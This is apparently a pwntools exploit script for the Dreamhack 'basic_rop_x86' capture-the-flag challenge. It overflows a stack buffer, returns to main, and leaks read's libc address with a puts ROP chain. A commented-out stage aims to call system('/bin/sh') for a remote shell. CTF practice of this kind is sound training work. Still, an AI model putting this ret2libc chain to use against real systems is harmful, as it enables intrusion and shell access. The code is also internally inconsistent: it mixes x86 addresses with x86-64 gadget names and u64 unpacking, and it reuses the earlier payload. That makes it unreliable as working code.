from pwn import *


# Define slog function
def slog(n, m): return success(": ".join([n, hex(m)]))


# Connection
HOST = 'host3.dreamhack.games'
PORT = 11124
p = remote(HOST, PORT)
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')

# Set Context
context.arch = 'i386'
context.endian = 'little'
context.log_level = 'debug'

# Exploit
read_plt = e.plt['read']
puts_plt = e.plt['puts']
main = e.symbols['main']
pop_ebx = 0x080483d9
# pppr = 0x08048689
slog('main', main)

buf = b'A' * 0x40  # buf
payload = buf + b'B' * 0x08  # buf + dummy + sfp

# ret2main
p.send(payload + p32(main))
p.recvuntil(buf)

# Exploit
read_got = e.got['read']

# puts(read_got)
payload += p32(pop_ebx) + p32(read_got)
payload += p32(puts_plt)
payload += p32(main)

p.send(payload)
p.recvuntil(buf)
print(p.recv(4))
# read = u64(p.recv(6) + b'\x00\x00')
# libc_base = read - libc.symbols['read']
# system = libc_base + libc.symbols['system']
# slog('read', read)
# slog('libc_base', libc_base)
# slog('system', system)

# # Return to main
# payload = buf + b'A' * 0x08  # buf + sfp

# ## read(0, read_got, 0x10)
# payload += p32(pop_rdi) + p32(0)
# payload += p32(pop_rsi_r15) + p32(read_got) + p32(0)
# payload += p32(read_plt)

# ## read('/bin/sh') == system('/bin/sh')
# payload += p32(pop_rdi)
# payload += p32(read_got + 0x8)
# payload += p32(read_plt)

# p.send(payload)
# p.recvuntil(buf)
# p.send(p32(system) + b'/bin/sh\x00')

# p.interactive()
